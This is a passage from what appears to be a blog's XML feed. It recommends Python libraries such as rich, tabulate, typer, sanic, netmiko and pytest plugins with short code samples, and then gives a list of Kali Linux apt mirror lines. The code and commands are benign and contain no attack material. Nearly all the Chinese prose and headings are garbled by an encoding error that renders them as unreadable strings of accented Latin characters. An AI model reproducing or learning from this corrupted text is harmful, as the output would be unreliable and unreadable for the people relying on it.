åº“ï¼Œå¯ä»¥ä¸ºæ‚¨åœ¨ç»ˆç«¯ä¸­æä¾›å¯Œæ–‡æœ¬å’Œç²¾ç¾æ ¼å¼ã€‚</p><p><a href="https://rich.readthedocs.io/en/latest/">Rich API</a> å¯ä»¥å¾ˆå®¹æ˜“çš„åœ¨ç»ˆç«¯è¾“å‡ºæ·»åŠ å„ç§é¢œè‰²å’Œä¸åŒé£æ ¼ã€‚Rich è¿˜å¯ä»¥ç»˜åˆ¶æ¼‚äº®çš„è¡¨æ ¼ï¼Œè¿›åº¦æ¡ï¼Œmarkdownï¼Œçªå‡ºæ˜¾ç¤ºè¯­æ³•çš„æºä»£ç åŠå›æº¯ç­‰ç­‰ï¼Œä¸èƒœæšä¸¾ã€‚</p><p>å¦å¤–richè¿˜æœ‰ä¸ªéå¸¸æ¼‚äº®çš„tracebackï¼Œ<a href="https://rich.readthedocs.io/en/latest/traceback.html#automatic-traceback-handler">è¿™é‡Œ</a>å‘Šè¯‰äº†å¦‚ä½•æ·»åŠ ä½¿ç”¨ã€‚</p><h3 id="tabulate-è½»æ¾å®ç°å­—ç¬¦è¡¨æ ¼"><a href="#tabulate-è½»æ¾å®ç°å­—ç¬¦è¡¨æ ¼" class="headerlink" title="tabulate è½»æ¾å®ç°å­—ç¬¦è¡¨æ ¼"></a>tabulate <strong>è½»æ¾å®ç°å­—ç¬¦è¡¨æ ¼</strong></h3><ul><li><a href="https://python.fasionchan.com/zh_CN/latest/libs/tabulate.html">å¿«é€Ÿä¸Šæ‰‹</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tabulate <span class="hljs-keyword">import</span> tabulate</span><span class="line"></br></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>table_header = [<span class="hljs-string">&#x27;Name&#x27;</span>, <span class="hljs-string">&#x27;Chinese&#x27;</span>, <span class="hljs-string">&#x27;Math&#x27;</span>, <span class="hljs-string">&#x27;English&#x27;</span>]</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>table_data = [</span><span class="line"><span class="hljs-meta">... </span>    (<span class="hljs-string">&#x27;Tom&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>, <span class="hljs-string">&#x27;85&#x27;</span>),</span><span class="line"><span class="hljs-meta">... </span>    (<span class="hljs-string">&#x27;Jim&#x27;</span>, <span class="hljs-string">&#x27;70&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>),</span><span class="line"><span class="hljs-meta">... </span>    (<span class="hljs-string">&#x27;Lucy&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>, <span class="hljs-string">&#x27;70&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>),</span><span class="line"><span class="hljs-meta">... </span>]</span><span class="line"></br></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(tabulate(table_data, headers=table_header, tablefmt=<span class="hljs-string">&#x27;grid&#x27;</span>))</span><span class="line">+--------+-----------+--------+-----------+</span><span class="line">| Name   |   Chinese |   Math |   English |</span><span class="line">+========+===========+========+===========+</span><span class="line">| Tom    |        <span class="hljs-number">90</span> |     <span class="hljs-number">80</span> |        <span class="hljs-number">85</span> |</span><span class="line">+--------+-----------+--------+-----------+</span><span class="line">| Jim    |        <span class="hljs-number">70</span> |     <span class="hljs-number">90</span> |        <span class="hljs-number">80</span> |</span><span class="line">+--------+-----------+--------+-----------+</span><span class="line">| Lucy   |        <span class="hljs-number">90</span> |     <span class="hljs-number">70</span> |        <span class="hljs-number">90</span> |</span><span class="line">+--------+-----------+--------+-----------+</span></code></pre></div></div><p>ä¸­æ–‡å¯¹é½å¼•å…¥<code>import wcwidth</code></p><h2 id="bpython-ä»£æ›¿åŸç”Ÿpythonäº¤äº’è§£é‡Šå™¨"><a href="#bpython-ä»£æ›¿åŸç”Ÿpythonäº¤äº’è§£é‡Šå™¨" class="headerlink" title="bpython ä»£æ›¿åŸç”Ÿpythonäº¤äº’è§£é‡Šå™¨"></a>bpython <strong>ä»£æ›¿åŸç”Ÿpythonäº¤äº’è§£é‡Šå™¨</strong></h2><ul><li><p><a href="https://bpython-interpreter.org/">å¿«é€Ÿä¸Šæ‰‹</a></p></li><li><p><code>Ctrl + R</code> å›é€€</p></li><li><p><code>F7</code> ä»ç¼–è¾‘å™¨æ‰“å¼€</p></li><li><p><code>F8</code> å°†ä»£ç å¤åˆ¶å‡ºæ¥</p></li></ul><h2 id="æ–‡ä»¶å¤„ç†"><a href="#æ–‡ä»¶å¤„ç†" class="headerlink" title="æ–‡ä»¶å¤„ç†"></a>æ–‡ä»¶å¤„ç†</h2><h2 id="å›¾åƒå¤„ç†"><a href="#å›¾åƒå¤„ç†" class="headerlink" title="å›¾åƒå¤„ç†"></a>å›¾åƒå¤„ç†</h2><h2 id="æ¸¸æˆå’Œå¤šåª’ä½“"><a href="#æ¸¸æˆå’Œå¤šåª’ä½“" class="headerlink" title="æ¸¸æˆå’Œå¤šåª’ä½“"></a>æ¸¸æˆå’Œå¤šåª’ä½“</h2><h2 id="å¤§æ•°æ®ä¸ç§‘å­¦è®¡ç®—"><a href="#å¤§æ•°æ®ä¸ç§‘å­¦è®¡ç®—" class="headerlink" title="å¤§æ•°æ®ä¸ç§‘å­¦è®¡ç®—"></a>å¤§æ•°æ®ä¸ç§‘å­¦è®¡ç®—</h2><h2 id="äººå·¥åªèƒ½ä¸æœºå™¨å­¦ä¹ "><a href="#äººå·¥åªèƒ½ä¸æœºå™¨å­¦ä¹ " class="headerlink" title="äººå·¥åªèƒ½ä¸æœºå™¨å­¦ä¹ "></a>äººå·¥åªèƒ½ä¸æœºå™¨å­¦ä¹ </h2><h2 id="ç³»ç»Ÿä¸å‘½ä»¤è¡Œ"><a href="#ç³»ç»Ÿä¸å‘½ä»¤è¡Œ" class="headerlink" title="ç³»ç»Ÿä¸å‘½ä»¤è¡Œ"></a>ç³»ç»Ÿä¸å‘½ä»¤è¡Œ</h2><h3 id="apscheduler-å®šæ—¶ä»»åŠ¡æ¡†æ¶"><a href="#apscheduler-å®šæ—¶ä»»åŠ¡æ¡†æ¶" class="headerlink" title="apscheduler å®šæ—¶ä»»åŠ¡æ¡†æ¶"></a>apscheduler <strong>å®šæ—¶ä»»åŠ¡æ¡†æ¶</strong></h3><p>apscheduleræä¾›äº†éå¸¸ä¸°å¯Œè€Œä¸”æ–¹ä¾¿æ˜“ç”¨çš„å®šæ—¶ä»»åŠ¡æ¥å£</p><ul><li><a href="https://zhuanlan.zhihu.com/p/561339788">å¿«é€Ÿä¸Šæ‰‹</a></li></ul><h3 id="prompt-toolkit-ç›¸å½“å¼ºå¤§çš„å‘½ä»¤è¡Œç•Œé¢å·¥å…·ç®±"><a href="#prompt-toolkit-ç›¸å½“å¼ºå¤§çš„å‘½ä»¤è¡Œç•Œé¢å·¥å…·ç®±" class="headerlink" title="prompt_toolkit ç›¸å½“å¼ºå¤§çš„å‘½ä»¤è¡Œç•Œé¢å·¥å…·ç®±"></a>prompt_toolkit <strong>ç›¸å½“å¼ºå¤§çš„å‘½ä»¤è¡Œç•Œé¢å·¥å…·ç®±</strong></h3><ul><li><a href="https://python-prompt-toolkit.readthedocs.io/en/master/">å¿«é€Ÿä¸Šæ‰‹</a></li><li><a href="/2022/03/01/%E4%B8%80%E4%B8%AA%E6%9E%81%E7%AE%80%E7%9A%84REPL%E4%BA%A4%E4%BA%92%E7%A4%BA%E8%8C%83/" title="ä¸€ä¸ªæç®€çš„REPLäº¤äº’ç¤ºèŒƒ">ä¸€ä¸ªæç®€çš„REPLäº¤äº’ç¤ºèŒƒ</a></li></ul><p><code>prompt_toolkit</code>æ˜¯ä¸€ä¸ªç”¨äºåœ¨Pythonä¸­æ„å»ºå¼ºå¤§çš„äº¤äº’å‘½ä»¤è¡Œå’Œç»ˆç«¯åº”ç”¨ç¨‹åºçš„åº“ï¼ŒåŒæ—¶å®ƒä¹Ÿå¯ç”¨äºæ„å»ºå…¨å±åº”ç”¨ç¨‹åºã€‚</p><h3 id="click-æ›¿ä»£Argparse"><a href="#click-æ›¿ä»£Argparse" class="headerlink" title="click æ›¿ä»£Argparse"></a>click <strong>æ›¿ä»£Argparse</strong></h3><ul><li><a href="https://www.cnblogs.com/xiao-apple36/p/9089027.html">å¿«é€Ÿä¸Šæ‰‹</a></li></ul><p>Python å†…ç½®äº†ä¸€ä¸ª Argparse çš„æ ‡å‡†åº“ç”¨äºåˆ›å»ºå‘½ä»¤è¡Œï¼Œä½†ä½¿ç”¨èµ·æ¥æœ‰äº›ç¹çï¼ŒClick ç›¸æ¯”äº Argparseï¼Œå°±å¥½æ¯” requests ç›¸æ¯”äº urllibã€‚</p><p>å¸¸ç”¨<code>click.confirm</code>:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line"><span class="hljs-keyword">if</span> click.confirm(<span class="hljs-string">&quot;Do you want to kick this off with an Nmap scan?&quot;</span>, default=<span class="hljs-literal">True</span>):</span><span class="line">    dosomething()</span></code></pre></div></div><h3 id="typer-å‡çº§ç‰ˆclick"><a href="#typer-å‡çº§ç‰ˆclick" class="headerlink" title="typer å‡çº§ç‰ˆclick"></a>typer <strong>å‡çº§ç‰ˆclick</strong></h3><ul><li><a href="https://typer.tiangolo.com/">å¿«é€Ÿä¸Šæ‰‹</a></li><li><a href="/2022/02/23/python-typer-%E5%BA%93%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" title="python typer åº“ä½¿ç”¨æŒ‡å—">python typer åº“ä½¿ç”¨æŒ‡å—</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">pip install typer</span><span class="line">pip install typer-cli</span></code></pre></div></div><blockquote><p>ä½ ä¸å¿…æ€»æ˜¯è¦ç¼–å†™ CLI åº”ç”¨ç¨‹åºï¼Œä½†æ˜¯åœ¨ç¼–å†™ CLI æ—¶ï¼Œæœ€å¥½æ˜¯æ— éšœç¢çš„ä½“éªŒã€‚ç»§ FastAPI å·¨å¤§æˆåŠŸä¹‹åï¼ŒSebastiÃ¡n RamÃ­rez ç”¨åŒæ ·çš„åŸåˆ™ä¸ºæˆ‘ä»¬å¸¦æ¥äº† Typerï¼šä¸€ä¸ªæ–°çš„åº“ï¼Œé€šè¿‡åˆ©ç”¨ Python 3.6+ çš„ç±»å‹æç¤ºåŠŸèƒ½ï¼Œå¯ä»¥ç¼–å†™å‘½ä»¤è¡Œç•Œé¢ã€‚</p></blockquote><blockquote><p>è¿™ä¸ªè®¾è®¡ç¡®å®ä½¿ Typer è„±é¢–è€Œå‡ºã€‚é™¤ç¡®ä¿ä½ çš„ä»£ç è¢«æ­£ç¡®åœ°è®°å½•ä¸‹æ¥å¤–ï¼Œä½ è¿˜å¯ä»¥é€šè¿‡æœ€å°‘çš„åŠªåŠ›æ¥è·å¾—ä¸€ä¸ªå¸¦æœ‰éªŒè¯çš„ CLI æ¥å£ã€‚ä½¿ç”¨ç±»å‹æç¤ºï¼Œä½ å¯ä»¥åœ¨ Python ç¼–è¾‘å™¨ä¸­è·å¾—è‡ªåŠ¨å®ŒæˆåŠŸèƒ½ï¼ˆæ¯”å¦‚ VSCodeï¼‰ï¼Œä»è€Œæé«˜å·¥ä½œæ•ˆç‡ã€‚</p></blockquote><blockquote><p>ä¸ºå¢å¼º Typer åŠŸèƒ½ï¼Œå®ƒçš„å†…éƒ¨æ˜¯åŸºäº Click å¼€å‘çš„ï¼ŒClick æ˜¯éå¸¸è‘—åçš„ï¼Œå¹¶ä¸”å·²ç»é€šè¿‡äº†å®æˆ˜æ£€éªŒã€‚è¿™æ„å‘³ç€ï¼Œå®ƒå¯ä»¥åˆ©ç”¨å…¶æ‰€æœ‰çš„ä¼˜ç‚¹ã€ç¤¾åŒºå’Œæ’ä»¶ï¼ŒåŒæ—¶ç”¨è¾ƒå°‘çš„æ ·æ¿ä»£ç ä»ç®€å•çš„å¼€å§‹ï¼Œå¹¶åœ¨éœ€è¦æ—¶æ·»åŠ æ›´å¤šçš„å¤æ‚æ€§ã€‚</p></blockquote><blockquote><p>ä¸€å¦‚æ—¢å¾€ï¼Œå®ƒçš„æ–‡æ¡£çœŸçš„å¾ˆå‡ºè‰²ï¼Œå¯ä»¥ä½œä¸ºå…¶ä»–é¡¹ç›®çš„å…¸èŒƒã€‚è¿™ç»å¯¹æ˜¯ä¸å®¹é”™è¿‡çš„ä½œå“ã€‚</p></blockquote><p>ä½†æ˜¯æ‰€æœ‰è¿™ç§ç±»å‹çš„CLIéƒ½å¹¶ä¸å¥½çœ‹ï¼Œå¹¶ä¸”ä¸æ”¯æŒçµæ´»çš„é¢œè‰²æ–¹æ¡ˆï¼Œæ‰€ä»¥æˆ‘å°†<code>rich</code>å’Œ<code>typer</code>ç»“åˆäº†ä¸€èµ·ã€‚</p><p><a href="https://github.com/Elinpf/rich_typer">rich_typer</a>å®Œå…¨å…¼å®¹typerå¹¶ä¸”ç»™å‡ºäº†æ›´å¥½çš„é…è‰²æ–¹æ¡ˆå’Œæ ·å¼ã€‚è‡ªå®šä¹‰ç¨‹åº¦ä¹Ÿæ›´å¥½ã€‚</p><h3 id="DearPyGui-GUI-æ¡†æ¶"><a href="#DearPyGui-GUI-æ¡†æ¶" class="headerlink" title="DearPyGui GUI æ¡†æ¶"></a>DearPyGui <strong>GUI æ¡†æ¶</strong></h3><ul><li><a href="https://www.jianshu.com/p/4b69d760c36b">å¿«é€Ÿä¸Šæ‰‹</a></li><li><a href="https://github.com/hoffstadt/DearPyGui">Github</a></li></ul><p>ä¸å…¶ä»– Python GUI åº“ç›¸æ¯”ï¼ŒDear PyGui å…·æœ‰ä»¥ä¸‹ç‹¬ç‰¹ä¹‹å¤„ï¼š</p><ul><li>GPU æ¸²æŸ“</li><li>ç®€å•çš„å†…ç½®å¼‚æ­¥åŠŸèƒ½æ”¯æŒ</li><li>å®Œæ•´çš„ä¸»é¢˜å’Œæ ·å¼æ§åˆ¶</li><li>ç®€å•çš„å†…ç½®æ—¥å¿—çª—å£</li><li>70 å¤šä¸ªå°éƒ¨ä»¶å…·æœ‰æ•°ç™¾ç§å°éƒ¨ä»¶ç»„åˆ</li><li>è¯¦ç»†çš„æ–‡æ¡£ï¼Œç¤ºä¾‹å’Œæ— ä¸ä¼¦æ¯”çš„æ”¯æŒ</li></ul><h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><h3 id="sqlmodel-æ›¿ä»£SQLAlchemy"><a href="#sqlmodel-æ›¿ä»£SQLAlchemy" class="headerlink" title="sqlmodel æ›¿ä»£SQLAlchemy"></a>sqlmodel <strong>æ›¿ä»£SQLAlchemy</strong></h3><ul><li><a href="https://sqlmodel.tiangolo.com/tutorial/">å¿«é€Ÿä¸Šæ‰‹</a></li><li><a href="/2022/10/24/sqlmodel-%E5%AD%A6%E4%B9%A0/" title="sqlmode å­¦ä¹ ">sqlmode å­¦ä¹ </a></li></ul><p>æ˜¯ <code>SQLAlchemy</code> å’Œ <code>pydantic</code> çš„ç»“åˆ</p><p>ä¸Šæ‰‹å¿«ï¼Œäººæ€§åŒ–ï¼Œæ”¯æŒ autocomplete</p><h2 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h2><h3 id="netmiko-SSH"><a href="#netmiko-SSH" class="headerlink" title="netmiko SSH"></a>netmiko <strong>SSH</strong></h3><p>netmiko æ˜¯ <code>parmiko</code>çš„å»¶ä¼¸åº“ï¼Œé’ˆå¯¹ç½‘ç»œçš„åœºæ™¯è¿›è¡Œäº†ä¼˜åŒ–å’Œç®€åŒ–ã€‚</p><ul><li><a href="https://zhuanlan.zhihu.com/p/367962211">å¿«é€Ÿä¸Šæ‰‹</a></li></ul><h3 id="ntc-templates-elinpf-textFSMç½‘ç»œè®¾å¤‡é…ç½®è§£ææ¨¡æ¿"><a href="#ntc-templates-elinpf-textFSMç½‘ç»œè®¾å¤‡é…ç½®è§£ææ¨¡æ¿" class="headerlink" title="ntc_templates_elinpf textFSMç½‘ç»œè®¾å¤‡é…ç½®è§£ææ¨¡æ¿"></a>ntc_templates_elinpf <strong>textFSMç½‘ç»œè®¾å¤‡é…ç½®è§£ææ¨¡æ¿</strong></h3><p>ä½œä¸º<code>ntc_templates</code>åº“çš„è¡¥å……ï¼Œå¢åŠ å¹¶ä¸”ç»´æŠ¤ä¸­å›½ä¸»æµç½‘ç»œè®¾å¤‡çš„é…ç½®è§£ææ¨¡æ¿ã€‚</p><ul><li><a href="https://github.com/Elinpf/ntc-templates">Github</a></li></ul><h3 id="net-inspect-ç½‘ç»œè®¾å¤‡ä¿¡æ¯è§£ææ¡†æ¶"><a href="#net-inspect-ç½‘ç»œè®¾å¤‡ä¿¡æ¯è§£ææ¡†æ¶" class="headerlink" title="net_inspect ç½‘ç»œè®¾å¤‡ä¿¡æ¯è§£ææ¡†æ¶"></a>net_inspect <strong>ç½‘ç»œè®¾å¤‡ä¿¡æ¯è§£ææ¡†æ¶</strong></h3><p>net_inspectæ˜¯ä¸€ä¸ªåŸºäºpythonçš„ç½‘ç»œè®¾å¤‡æ•°æ®è§£æè‡ªåŠ¨åŒ–æ¡†æ¶</p><ul><li><a href="https://github.com/Elinpf/net_inspect">Github</a></li></ul><h3 id="nornir-ç½‘ç»œè®¾å¤‡è‡ªåŠ¨åŒ–æ¡†æ¶"><a href="#nornir-ç½‘ç»œè®¾å¤‡è‡ªåŠ¨åŒ–æ¡†æ¶" class="headerlink" title="nornir ç½‘ç»œè®¾å¤‡è‡ªåŠ¨åŒ–æ¡†æ¶"></a>nornir <strong>ç½‘ç»œè®¾å¤‡è‡ªåŠ¨åŒ–æ¡†æ¶</strong></h3><p>nornir æ˜¯ä¸€ä¸ª Python åº“ï¼Œç”¨äºè‡ªåŠ¨åŒ–ç½‘ç»œè®¾å¤‡çš„é…ç½®å’Œç®¡ç†ã€‚å®ƒçš„ç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªç®€å•çš„ã€æ˜“äºä½¿ç”¨çš„ã€å¯æ‰©å±•çš„æ¡†æ¶ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥ä½¿ç”¨ Python ç¼–å†™è‡ªåŠ¨åŒ–è„šæœ¬ã€‚</p><ul><li><a href="https://github.com/nornir-automation/nornir">Github</a></li></ul><h2 id="Webæ¡†æ¶"><a href="#Webæ¡†æ¶" class="headerlink" title="Webæ¡†æ¶"></a>Webæ¡†æ¶</h2><h3 id="sanic-æé€Ÿå¼‚æ­¥webæ¡†æ¶"><a href="#sanic-æé€Ÿå¼‚æ­¥webæ¡†æ¶" class="headerlink" title="sanic æé€Ÿå¼‚æ­¥webæ¡†æ¶"></a>sanic <strong>æé€Ÿå¼‚æ­¥webæ¡†æ¶</strong></h3><ul><li><a href="https://sanic.dev/zh/guide/getting-started.html#%E5%AE%89%E8%A3%85-install">å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://www.cnblogs.com/traditional/p/14305650.html">å¿«é€Ÿä¸Šæ‰‹</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><span class="line"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> (</span><span class="line">    Sanic,</span><span class="line">    request,</span><span class="line">    response</span><span class="line">)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ª Sanic å®ä¾‹å¯¹è±¡, Sanic æ˜¯ web æœåŠ¡çš„å…¥å£ç±», å®ƒç­‰ä»·äº flask.Flask</span></span><span class="line"><span class="hljs-comment"># ç„¶åé‡Œé¢ä¼ é€’ä¸€ä¸ªå­—ç¬¦ä¸², ä¸ºæˆ‘ä»¬çš„åº”ç”¨èµ·ä¸€ä¸ªåå­—</span></span><span class="line">app = Sanic(<span class="hljs-string">&quot;sanic_service&quot;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># è¿™é‡Œé€šè¿‡ @app.get(&quot;è·¯ç”±&quot;) çš„æ–¹å¼å’Œä¸€ä¸ªè§†å›¾å‡½æ•°è¿›è¡Œç»‘å®š</span></span><span class="line"><span class="hljs-comment"># è§†å›¾å‡½æ•°ä¸­çš„ request å‚æ•°ä¼šæ¥æ”¶ä¸€ä¸ª sanic.request.Request å®ä¾‹å¯¹è±¡, å®ƒåŒ…å«äº†æ¥æ”¶åˆ°çš„è¯·æ±‚ä¸­çš„æ‰€æœ‰ä¿¡æ¯</span></span><span class="line"><span class="hljs-comment"># æ¯”å¦‚æˆ‘ä»¬æƒ³è·å– url ä¸­çš„æŸ¥è¯¢å‚æ•°, é‚£ä¹ˆå°±éœ€è¦é€šè¿‡è¿™é‡Œçš„ request è·å–, è¿™ä¸ªå‚æ•°åœ¨è¯·æ±‚åˆ°æ¥æ—¶ä¼šè‡ªåŠ¨ä¼ é€’</span></span><span class="line"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/index&quot;</span></span>)</span></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>(<span class="hljs-params">request: request.Request</span>):</span></span><span class="line">    <span class="hljs-comment"># è¿™ä¸ªå‚æ•°æˆ‘ä»¬æš‚æ—¶å…ˆä¸ç”¨, ä½†æ˜¯ä¸€å®šè¦æœ‰</span></span><span class="line">    <span class="hljs-comment"># è¿™é‡Œç›´æ¥è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><span class="line">    <span class="hljs-keyword">return</span> response.text(<span class="hljs-string">&quot;hello world&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># host: ç›‘å¬çš„IP, port: ç›‘å¬çš„ç«¯å£, auto_reload: ä¿®æ”¹ä»£ç ä¹‹åæ˜¯å¦è‡ªåŠ¨é‡å¯</span></span><span class="line">app.run(host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>, port=<span class="hljs-number">8888</span>)</span></code></pre></div></div><h3 id="simpleui-Djangoä¸»é¢˜"><a href="#simpleui-Djangoä¸»é¢˜" class="headerlink" title="simpleui Djangoä¸»é¢˜"></a>simpleui <strong>Djangoä¸»é¢˜</strong></h3><ul><li><a href="https://github.com/newpanjing/simpleui">Github</a></li></ul><h2 id="å®‰å…¨"><a href="#å®‰å…¨" class="headerlink" title="å®‰å…¨"></a>å®‰å…¨</h2><h3 id="schema-éªŒè¯è¾“å…¥"><a href="#schema-éªŒè¯è¾“å…¥" class="headerlink" title="schema éªŒè¯è¾“å…¥"></a>schema <strong>éªŒè¯è¾“å…¥</strong></h3><ul><li><a href="https://segmentfault.com/a/1190000011777230">å¿«é€Ÿä¸Šæ‰‹</a></li></ul><p>ä¸ç®¡æˆ‘ä»¬åšä»€ä¹ˆåº”ç”¨ï¼Œåªè¦å’Œç”¨æˆ·è¾“å…¥æ‰“äº¤é“ï¼Œå°±æœ‰ä¸€ä¸ªåŸåˆ™ â€“ æ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥æ•°æ®ã€‚æ„å‘³ç€æˆ‘ä»¬è¦å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œweb å¼€å‘æ—¶ä¸€èˆ¬è¾“å…¥æ•°æ®éƒ½ä»¥ JSON å½¢å¼å‘é€åˆ°åç«¯ APIï¼ŒAPI è¦å¯¹è¾“å…¥æ•°æ®åšéªŒè¯ã€‚ä¸€èˆ¬æˆ‘éƒ½æ˜¯åŠ å¾ˆå¤šåˆ¤æ–­ï¼Œå„ç§ifï¼Œå¯¼è‡´ä»£ç å¾ˆä¸‘é™‹ï¼Œèƒ½ä¸èƒ½æœ‰ä¸€ç§æ–¹å¼æ¯”è¾ƒä¼˜é›…çš„éªŒè¯ç”¨æˆ·æ•°æ®å‘¢ï¼ŸSchemaå°±æ´¾ä¸Šç”¨åœºäº†ã€‚</p><h2 id="æ„å»ºå°è£…"><a href="#æ„å»ºå°è£…" class="headerlink" title="æ„å»ºå°è£…"></a>æ„å»ºå°è£…</h2><h2 id="ä»£ç è°ƒè¯•"><a href="#ä»£ç è°ƒè¯•" class="headerlink" title="ä»£ç è°ƒè¯•"></a>ä»£ç è°ƒè¯•</h2><h3 id="mock-è™šå‡å€¼æµ‹è¯•"><a href="#mock-è™šå‡å€¼æµ‹è¯•" class="headerlink" title="mock è™šå‡å€¼æµ‹è¯•"></a>mock <strong>è™šå‡å€¼æµ‹è¯•</strong></h3><p>ç”¨äºæµ‹è¯•çš„æ¨¡å—pytest-mockï¼Œå°†æ–¹æ³•å±è”½æ‰å¹¶ç»™å‡ºè™šå‡çš„è¿”å›å€¼ã€‚</p><h3 id="pytest-datadir-æµ‹è¯•æ—¶çš„æ•°æ®æ–‡ä»¶è°ƒç”¨"><a href="#pytest-datadir-æµ‹è¯•æ—¶çš„æ•°æ®æ–‡ä»¶è°ƒç”¨" class="headerlink" title="pytest-datadir æµ‹è¯•æ—¶çš„æ•°æ®æ–‡ä»¶è°ƒç”¨"></a>pytest-datadir <strong>æµ‹è¯•æ—¶çš„æ•°æ®æ–‡ä»¶è°ƒç”¨</strong></h3><ul><li><a href="https://pypi.org/project/pytest-datadir/">å®˜æ–¹æ–‡æ¡£</a></li></ul><p>e.g </p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_read_global</span>(<span class="hljs-params">shared_datadir</span>):</span></span><span class="line">    contents = (shared_datadir / <span class="hljs-string">&#x27;hello.txt&#x27;</span>).read_text()</span></code></pre></div></div><h3 id="pytest-asyncio-å®ç°å¼‚æ­¥æµ‹è¯•"><a href="#pytest-asyncio-å®ç°å¼‚æ­¥æµ‹è¯•" class="headerlink" title="pytest-asyncio å®ç°å¼‚æ­¥æµ‹è¯•"></a>pytest-asyncio <strong>å®ç°å¼‚æ­¥æµ‹è¯•</strong></h3><p>å®‰è£…<code>pytest-asyncio</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">@pytest.mark.asyncio</span></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_main</span>():</span></span><span class="line">    ...</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> todo </tag>
            
            <tag> python </tag>
            
            <tag> æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali aptæº</title>
      <link href="/2022/02/18/kali-apt%E6%BA%90/"/>
      <url>/2022/02/18/kali-apt%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<p>ä¿®æ”¹<code>/etc/apt/sources.list</code>æ–‡ä»¶</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line"><span class="hljs-comment">#é˜¿é‡Œäº‘</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com/kali kali-rolling main non-free contrib</span><span class="line">deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com/kali kali-rolling main non-free contrib</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#ä¸­ç§‘å¤§</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><span class="line">deb-src http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#æ¸…åå¤§å­¦</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><span class="line">deb-src https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#æµ™å¤§</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><span class="line">deb-src http:<span class="hljs-regexp">//mi</span>rrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#ä¸œè½¯å¤§å­¦</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.neusoft.edu.cn<span class="hljs-regexp">/kali kali-rolling/m</span>ain non-free contrib</span><span class="line">deb-src http:<span class="hljs-regexp">//mi</span>rrors.neusoft.edu.cn<span class="hljs-regexp">/kali kali-rolling/m</span>ain non-free contrib</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#å®˜æ–¹æº</span></span><span class="line">deb http:<span class="hljs-regexp">//</span>http.kali.org/kali kali-rolling main non-free contrib</span><span class="line">deb-src http:<span class="hljs-regexp">//</span>http.kali.org/kali kali-rolling main non-free contrib</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç³»ç»Ÿ </category>
          
          <category> linux </category>
          
      </categories>
